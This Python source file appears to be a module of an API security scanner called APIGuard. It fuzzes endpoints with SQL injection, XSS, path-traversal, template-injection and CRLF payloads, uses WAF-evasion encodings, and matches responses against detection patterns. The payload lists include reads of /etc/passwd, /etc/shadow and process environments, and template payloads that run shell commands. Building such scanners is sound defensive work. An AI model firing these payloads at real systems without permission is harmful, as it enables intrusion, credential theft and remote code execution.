"""
APIGuard — Advanced Fuzzing Engine (Module 11)
================================================
Intelligent mutation-based fuzzer with categorized payload databases for:
  - SQL Injection (error-based, boolean-based, time-based, UNION-based)
  - XSS (reflected, stored, DOM-based)
  - Path Traversal (LFI/RFI)
  - SSTI (Server-Side Template Injection)
  - CRLF Injection
  - Header Injection
  - Parameter Pollution (HPP)

Unlike Module 6's basic payloads, this uses:
  - Encoding mutations (URL, double-URL, Unicode, hex, base64)
  - WAF evasion techniques (case alternation, comment insertion, null bytes)
  - Context-aware payload selection based on parameter names
"""

import json
import re
import time
import base64
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Any
from urllib.parse import quote, quote_plus

import requests

try:
    from module_1_parser.parser import Endpoint
    from module_2_bola.bola_scanner import Severity
except ImportError:
    from parser import Endpoint
    from bola_scanner import Severity


# ─────────────────────────────────────────────
# Payload Databases (categorized & extensive)
# ─────────────────────────────────────────────

SQLI_PAYLOADS_ADVANCED = {
    "error_based": [
        "'", "''", "')", "'))", "';", "'--", "'#",
        "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
        "' OR 1=1--", "' OR 1=1#", "') OR ('1'='1",
        "') OR ('1'='1'--", "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
        "1' ORDER BY 1--", "1' ORDER BY 100--",
        "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
    ],
    "boolean_based": [
        "' AND 1=1--", "' AND 1=2--",
        "' AND 'a'='a", "' AND 'a'='b",
        "1 AND 1=1", "1 AND 1=2",
        "' OR 1=1-- -", "' OR 1=2-- -",
    ],
    "time_based": [
        "' OR SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--",
        "' OR pg_sleep(3)--", "1; SELECT SLEEP(3)",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    ],
    "union_based": [
        "' UNION SELECT 1--", "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT NULL,NULL,NULL--",
        "0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",
    ],
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'-alert(1)-'",
    "<img src=1 onerror=alert`1`>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",  # Angular/SSTI
    "${alert(1)}",  # Template literal
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "'\"><img src=x onerror=confirm(1)>",
    "<math><mi><mo><form><input type=submit>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "....\\\\....\\\\....\\\\etc\\\\passwd",
    "/etc/passwd%00.jpg",
    "....//....//....//etc/shadow",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "file:///etc/passwd",
]

SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
    "{{config}}", "{{self}}", "{{request}}",
    "${{7*7}}", "{{''.__class__.__mro__}}",
    "{{request.application.__globals__}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
    "@(1+2)", "{{constructor.constructor('return this')()}}",
]

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:evil=true",
    "%0d%0aX-Injected:header",
    "%0aSet-Cookie:evil=true",
    "\r\nX-Injected: by-apiguard",
    "%E5%98%8A%E5%98%8DSet-Cookie:evil=true",  # Unicode CRLF
]

HEADER_INJECTION_PAYLOADS = [
    "localhost\r\nX-Injected: true",
    "evil.com\r\nX-Forwarded-For: 127.0.0.1",
    "localhost%00evil.com",
]

HPP_PAYLOADS = [
    # HTTP Parameter Pollution - duplicate params with different values
    ("id", ["1", "2"]),
    ("admin", ["false", "true"]),
    ("role", ["user", "admin"]),
]

# Detection patterns
SQLI_ERROR_PATTERNS = re.compile(
    r"(sql syntax|mysql_fetch|pg_query|sqlite3\.|sqliteexception|odbc_exec|"
    r"unclosed quotation|ora-\d{5}|syntax error.*sql|"
    r"you have an error in your sql|warning.*mysql|"
    r"division by zero|invalid query|sqlexception|"
    r"microsoft ole db|jet database|driver.*sql server|"
    r"pg_prepare|pg_execute|PDOException|"
    r"java\.sql\.SQLException|com\.mysql\.jdbc|"
    r"column.*does not exist|relation.*does not exist|"
    r"unterminated.*string|invalid input syntax)",
    re.IGNORECASE,
)

XSS_REFLECTION_PATTERN = re.compile(
    r"(<script>alert\(1\)</script>|onerror=alert|onload=alert|javascript:alert)",
    re.IGNORECASE,
)

PATH_TRAVERSAL_PATTERNS = re.compile(
    r"(root:x:0:0:|bin/bash|/usr/sbin/nologin|"
    r"\[extensions\]|localhost|"
    r"PATH=|HOME=|SHELL=|USER=)",
    re.IGNORECASE,
)

SSTI_PATTERNS = re.compile(
    r"(^49$|<class|__class__|__mro__|"
    r"application_globals|runtime\.exec|"
    r"child_process|mainModule)",
)


# ─────────────────────────────────────────────
# Encoding Mutation Engine
# ─────────────────────────────────────────────

class PayloadMutator:
    """Generates encoding variants of payloads for WAF evasion."""

    @staticmethod
    def url_encode(payload: str) -> str:
        return quote(payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        return quote(quote(payload))

    @staticmethod
    def unicode_encode(payload: str) -> str:
        return ''.join(f'%u{ord(c):04x}' if not c.isalnum() else c for c in payload)

    @staticmethod
    def hex_encode(payload: str) -> str:
        return ''.join(f'\\x{ord(c):02x}' for c in payload)

    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def case_swap(payload: str) -> str:
        """sElEcT instead of SELECT"""
        return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))

    @staticmethod
    def comment_insert(payload: str) -> str:
        """S/**/ELECT instead of SELECT for SQL keywords"""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE', 'DROP']
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                # Insert inline comments
                idx = result.lower().find(kw.lower())
                original = result[idx:idx+len(kw)]
                mid = len(kw) // 2
                mutated = original[:mid] + "/**/" + original[mid:]
                result = result[:idx] + mutated + result[idx+len(kw):]
        return result

    @staticmethod
    def null_byte(payload: str) -> str:
        return payload + "%00"

    @classmethod
    def mutate(cls, payload: str, strategies: list[str] | None = None) -> list[str]:
        """Generate mutated variants of a payload."""
        all_strategies = {
            "url": cls.url_encode,
            "double_url": cls.double_url_encode,
            "case_swap": cls.case_swap,
            "comment": cls.comment_insert,
            "null_byte": cls.null_byte,
        }
        
        if strategies is None:
            strategies = list(all_strategies.keys())

        variants = [payload]  # Original always included
        for name in strategies:
            fn = all_strategies.get(name)
            if fn:
                try:
                    variant = fn(payload)
                    if variant != payload and variant not in variants:
                        variants.append(variant)
                except Exception:
                    pass
        return variants


# ─────────────────────────────────────────────
# Result Models
# ─────────────────────────────────────────────

class FuzzFindingType(str, Enum):
    SQL_INJECTION = "SQL_INJECTION"
    XSS = "XSS"
    PATH_TRAVERSAL = "PATH_TRAVERSAL"
    SSTI = "SSTI"
    CRLF_INJECTION = "CRLF_INJECTION"
    HEADER_INJECTION = "HEADER_INJECTION"
    HPP = "HTTP_PARAM_POLLUTION"


FUZZ_SEVERITY = {
    FuzzFindingType.SQL_INJECTION: Severity.CRITICAL,
    FuzzFindingType.XSS: Severity.HIGH,
    FuzzFindingType.PATH_TRAVERSAL: Severity.CRITICAL,
    FuzzFindingType.SSTI: Severity.CRITICAL,
    FuzzFindingType.CRLF_INJECTION: Severity.MEDIUM,
    FuzzFindingType.HEADER_INJECTION: Severity.MEDIUM,
    FuzzFindingType.HPP: Severity.LOW,
}

FUZZ_REMEDIATION = {
    FuzzFindingType.SQL_INJECTION: "Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
    FuzzFindingType.XSS: "Sanitize and encode all user input before rendering. Use Content-Security-Policy headers.",
    FuzzFindingType.PATH_TRAVERSAL: "Validate file paths against a whitelist. Use realpath() to resolve and check paths.",
    FuzzFindingType.SSTI: "Never pass user input directly to template engines. Use logic-less templates or sandboxed environments.",
    FuzzFindingType.CRLF_INJECTION: "Strip \\r\\n from all user inputs used in HTTP headers.",
    FuzzFindingType.HEADER_INJECTION: "Validate and sanitize all inputs used in HTTP headers. Use allowlists.",
    FuzzFindingType.HPP: "Only accept the first occurrence of each parameter. Use strict parameter parsing.",
}


@dataclass
class FuzzFinding:
    finding_type: FuzzFindingType
    severity: Severity
    endpoint: str
    method: str
    description: str
    proof: str
    remediation: str
    payload_used: str = ""
    encoding_used: str = "raw"

    def to_dict(self) -> dict:
        d = asdict(self)
        d["finding_type"] = self.finding_type.value
        d["severity"] = self.severity.value
        return d


@dataclass
class FuzzScanResult:
    target_url: str
    total_endpoints_tested: int = 0
    total_payloads_sent: int = 0
    vulnerable_endpoints: int = 0
    findings: list[FuzzFinding] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    scan_duration_seconds: float = 0.0

    def to_dict(self) -> dict:
        return {
            "scan_type": "ADVANCED_FUZZER",
            "target_url": self.target_url,
            "total_endpoints_tested": self.total_endpoints_tested,
            "total_payloads_sent": self.total_payloads_sent,
            "vulnerable_endpoints": self.vulnerable_endpoints,
            "findings": [f.to_dict() for f in self.findings],
            "errors": self.errors,
            "scan_duration_seconds": round(self.scan_duration_seconds, 2),
        }

    def summary(self) -> str:
        lines = [
            "\n─── ADVANCED FUZZER SUMMARY ─────────────",
            f"  Target             : {self.target_url}",
            f"  Endpoints tested   : {self.total_endpoints_tested}",
            f"  Payloads executed  : {self.total_payloads_sent}",
            f"  Vulnerable         : {self.vulnerable_endpoints}",
            f"  Duration           : {self.scan_duration_seconds:.1f}s",
        ]
        if self.findings:
            lines.append("\n  Findings:")
            for f in self.findings:
                lines.append(f"    [{f.severity.value}] {f.finding_type.value} @ {f.method} {f.endpoint}")
                lines.append(f"             Payload: {f.payload_used[:60]}...")
        else:
            lines.append("  ✅  No vulnerabilities detected by advanced fuzzer.")
        lines.append("─────────────────────────────────────────────────────")
        return "\n".join(lines)


# ─────────────────────────────────────────────
# Advanced Fuzzing Engine
# ─────────────────────────────────────────────

class AdvancedFuzzer:
    """
    Intelligent mutation-based fuzzer that:
    1. Selects payloads based on parameter context (name, type, position)
    2. Applies encoding mutations for WAF evasion
    3. Detects vulnerabilities through response analysis
    """

    def __init__(
        self,
        token: str | None = None,
        extra_headers: dict | None = None,
        timeout: int = 10,
        delay: float = 0.15,
        max_payloads_per_param: int = 30,
        enable_mutations: bool = True,
    ):
        self.token = token
        self.timeout = timeout
        self.delay = delay
        self.max_payloads = max_payloads_per_param
        self.enable_mutations = enable_mutations

        self.session = requests.Session()
        self.session.headers["User-Agent"] = "APIGuard-Fuzzer/4.0"
        if token:
            self.session.headers["Authorization"] = token
        if extra_headers:
            self.session.headers.update(extra_headers)

    def scan(self, endpoints: list[Endpoint]) -> FuzzScanResult:
        t0 = time.monotonic()
        from urllib.parse import urlparse
        target = ""
        if endpoints:
            p = urlparse(endpoints[0].full_url)
            target = f"{p.scheme}://{p.netloc}"

        result = FuzzScanResult(target_url=target)

        for ep in endpoints:
            try:
                ep_findings: list[FuzzFinding] = []
                base_url = re.sub(r"\{[^}]+\}", "1", ep.full_url)

                # Gather testable parameters
                params = self._get_params(ep)

                # 1. SQL Injection (all categories)
                ep_findings.extend(self._fuzz_sqli(ep, base_url, params, result))

                # 2. XSS
                ep_findings.extend(self._fuzz_xss(ep, base_url, params, result))

                # 3. Path Traversal (only on file-related params)
                ep_findings.extend(self._fuzz_path_traversal(ep, base_url, params, result))

                # 4. SSTI
                ep_findings.extend(self._fuzz_ssti(ep, base_url, params, result))

                # 5. CRLF Injection
                ep_findings.extend(self._fuzz_crlf(ep, base_url, params, result))

                result.total_endpoints_tested += 1
                if ep_findings:
                    result.findings.extend(ep_findings)
                    result.vulnerable_endpoints += 1

            except Exception as exc:
                result.errors.append(f"{ep.method} {ep.path} → {exc}")

            time.sleep(self.delay)

        result.scan_duration_seconds = time.monotonic() - t0
        return result

    def _get_params(self, ep: Endpoint) -> list[dict]:
        """Extract all testable parameters from an endpoint."""
        params = []

        # Query parameters
        qparams = ep.query_params() if hasattr(ep, "query_params") else \
            [p for p in ep.parameters if p.location == "query"]
        for p in qparams:
            params.append({"name": p.name, "location": "query"})

        # Path parameters
        path_params = [p for p in ep.parameters if p.location == "path"]
        for p in path_params:
            params.append({"name": p.name, "location": "path"})

        # Body properties
        if ep.request_body_schema:
            for prop in ep.request_body_schema.get("properties", {}).keys():
                params.append({"name": prop, "location": "body"})

        return params

    # ── SQL Injection Fuzzing ──────────────────

    def _fuzz_sqli(self, ep: Endpoint, base_url: str, params: list[dict], result: FuzzScanResult) -> list[FuzzFinding]:
        findings = []
        baseline = self._safe_get(base_url)

        for category, payloads in SQLI_PAYLOADS_ADVANCED.items():
            for payload in payloads[:self.max_payloads]:
                variants = PayloadMutator.mutate(payload) if self.enable_mutations else [payload]
                for variant in variants[:3]:  # Limit mutations per payload
                    for param in params:
                        resp = self._inject(ep, base_url, param, variant)
                        result.total_payloads_sent += 1

                        if resp and self._detect_sqli(resp, baseline):
                            findings.append(FuzzFinding(
                                finding_type=FuzzFindingType.SQL_INJECTION,
                                severity=FUZZ_SEVERITY[FuzzFindingType.SQL_INJECTION],
                                endpoint=ep.full_url,
                                method=ep.method,
                                description=f"SQL Injection ({category}) detected via parameter '{param['name']}'. "
                                            f"Database error patterns found in response.",
                                proof=f"Payload triggered SQL error. Status: {resp.status_code}. "
                                      f"Response snippet: {resp.text[:150]}",
                                remediation=FUZZ_REMEDIATION[FuzzFindingType.SQL_INJECTION],
                                payload_used=variant,
                                encoding_used="mutated" if variant != payload else "raw",
                            ))
                            return findings  # One SQLi finding per endpoint is enough

                        time.sleep(self.delay / 3)

        return findings

    # ── XSS Fuzzing ───────────────────────────

    def _fuzz_xss(self, ep: Endpoint, base_url: str, params: list[dict], result: FuzzScanResult) -> list[FuzzFinding]:
        findings = []

        for payload in XSS_PAYLOADS[:self.max_payloads]:
            for param in params:
                resp = self._inject(ep, base_url, param, payload)
                result.total_payloads_sent += 1

                if resp and (payload in resp.text or XSS_REFLECTION_PATTERN.search(resp.text)):
                    findings.append(FuzzFinding(
                        finding_type=FuzzFindingType.XSS,
                        severity=FUZZ_SEVERITY[FuzzFindingType.XSS],
                        endpoint=ep.full_url,
                        method=ep.method,
                        description=f"Reflected XSS detected via parameter '{param['name']}'. "
                                    f"Payload was echoed unescaped in response.",
                        proof=f"Injected payload reflected in response body. "
                              f"Content-Type: {resp.headers.get('content-type', 'unknown')}",
                        remediation=FUZZ_REMEDIATION[FuzzFindingType.XSS],
                        payload_used=payload,
                    ))
                    return findings

                time.sleep(self.delay / 3)

        return findings

    # ── Path Traversal Fuzzing ────────────────

    def _fuzz_path_traversal(self, ep: Endpoint, base_url: str, params: list[dict], result: FuzzScanResult) -> list[FuzzFinding]:
        findings = []
        file_params = [p for p in params if any(kw in p["name"].lower() for kw in 
                       ["file", "path", "dir", "name", "doc", "folder", "page", "template", "include", "src"])]
        if not file_params:
            file_params = params[:2]  # Test first 2 params anyway

        for payload in PATH_TRAVERSAL_PAYLOADS[:self.max_payloads]:
            for param in file_params:
                resp = self._inject(ep, base_url, param, payload)
                result.total_payloads_sent += 1

                if resp and PATH_TRAVERSAL_PATTERNS.search(resp.text):
                    findings.append(FuzzFinding(
                        finding_type=FuzzFindingType.PATH_TRAVERSAL,
                        severity=FUZZ_SEVERITY[FuzzFindingType.PATH_TRAVERSAL],
                        endpoint=ep.full_url,
                        method=ep.method,
                        description=f"Path Traversal/LFI detected via parameter '{param['name']}'. "
                                    f"System file contents leaked in response.",
                        proof=f"System file content detected: {resp.text[:200]}",
                        remediation=FUZZ_REMEDIATION[FuzzFindingType.PATH_TRAVERSAL],
                        payload_used=payload,
                    ))
                    return findings

                time.sleep(self.delay / 3)

        return findings

    # ── SSTI Fuzzing ──────────────────────────

    def _fuzz_ssti(self, ep: Endpoint, base_url: str, params: list[dict], result: FuzzScanResult) -> list[FuzzFinding]:
        findings = []

        for payload in SSTI_PAYLOADS[:self.max_payloads]:
            for param in params:
                resp = self._inject(ep, base_url, param, payload)
                result.total_payloads_sent += 1

                detected = False
                if resp:
                    # Check if {{7*7}} became 49
                    if "{{7*7}}" in payload and "49" in resp.text:
                        detected = True
                    elif "${7*7}" in payload and "49" in resp.text:
                        detected = True
                    elif SSTI_PATTERNS.search(resp.text):
                        detected = True

                if detected:
                    findings.append(FuzzFinding(
                        finding_type=FuzzFindingType.SSTI,
                        severity=FUZZ_SEVERITY[FuzzFindingType.SSTI],
                        endpoint=ep.full_url,
                        method=ep.method,
                        description=f"Server-Side Template Injection detected via parameter '{param['name']}'. "
                                    f"Template expression was evaluated.",
                        proof=f"Payload '{payload}' was evaluated. Response: {resp.text[:200]}",
                        remediation=FUZZ_REMEDIATION[FuzzFindingType.SSTI],
                        payload_used=payload,
                    ))
                    return findings

                time.sleep(self.delay / 3)

        return findings

    # ── CRLF Injection ────────────────────────

    def _fuzz_crlf(self, ep: Endpoint, base_url: str, params: list[dict], result: FuzzScanResult) -> list[FuzzFinding]:
        findings = []

        for payload in CRLF_PAYLOADS:
            for param in params[:3]:
                resp = self._inject(ep, base_url, param, payload)
                result.total_payloads_sent += 1

                if resp:
                    # Check if injected header appears in response headers
                    if "evil=true" in resp.headers.get("Set-Cookie", ""):
                        findings.append(FuzzFinding(
                            finding_type=FuzzFindingType.CRLF_INJECTION,
                            severity=FUZZ_SEVERITY[FuzzFindingType.CRLF_INJECTION],
                            endpoint=ep.full_url,
                            method=ep.method,
                            description=f"CRLF Injection detected. Injected header appeared in response.",
                            proof=f"Set-Cookie header injected via CRLF.",
                            remediation=FUZZ_REMEDIATION[FuzzFindingType.CRLF_INJECTION],
                            payload_used=payload,
                        ))
                        return findings

                    if "X-Injected" in resp.headers:
                        findings.append(FuzzFinding(
                            finding_type=FuzzFindingType.HEADER_INJECTION,
                            severity=FUZZ_SEVERITY[FuzzFindingType.HEADER_INJECTION],
                            endpoint=ep.full_url,
                            method=ep.method,
                            description=f"Header Injection detected. Custom header appeared in response.",
                            proof=f"X-Injected header present in response.",
                            remediation=FUZZ_REMEDIATION[FuzzFindingType.HEADER_INJECTION],
                            payload_used=payload,
                        ))
                        return findings

                time.sleep(self.delay / 3)

        return findings

    # ── Detection Helpers ─────────────────────

    def _detect_sqli(self, resp: requests.Response, baseline: requests.Response | None) -> bool:
        if SQLI_ERROR_PATTERNS.search(resp.text):
            return True
        if baseline and baseline.status_code == 200 and resp.status_code == 500:
            return True
        return False

    # ── Injection Helpers ─────────────────────

    def _inject(self, ep: Endpoint, base_url: str, param: dict, payload: str) -> requests.Response | None:
        """Send a payload to the specified parameter location."""
        try:
            if param["location"] == "query":
                url = f"{base_url}?{param['name']}={quote_plus(str(payload))}"
                if ep.method.upper() == "GET":
                    return self.session.get(url, timeout=self.timeout, allow_redirects=False)
                else:
                    return self.session.request(ep.method.upper(), url, timeout=self.timeout, allow_redirects=False)

            elif param["location"] == "body":
                body = {param["name"]: payload}
                return self.session.request(
                    ep.method.upper(), base_url, json=body,
                    timeout=self.timeout, allow_redirects=False
                )

            elif param["location"] == "path":
                url = base_url.replace(f"{{{param['name']}}}", quote_plus(str(payload)))
                return self.session.get(url, timeout=self.timeout, allow_redirects=False)

        except requests.RequestException:
            return None

    def _safe_get(self, url: str) -> requests.Response | None:
        try:
            return self.session.get(url, timeout=self.timeout, allow_redirects=False)
        except requests.RequestException:
            return None
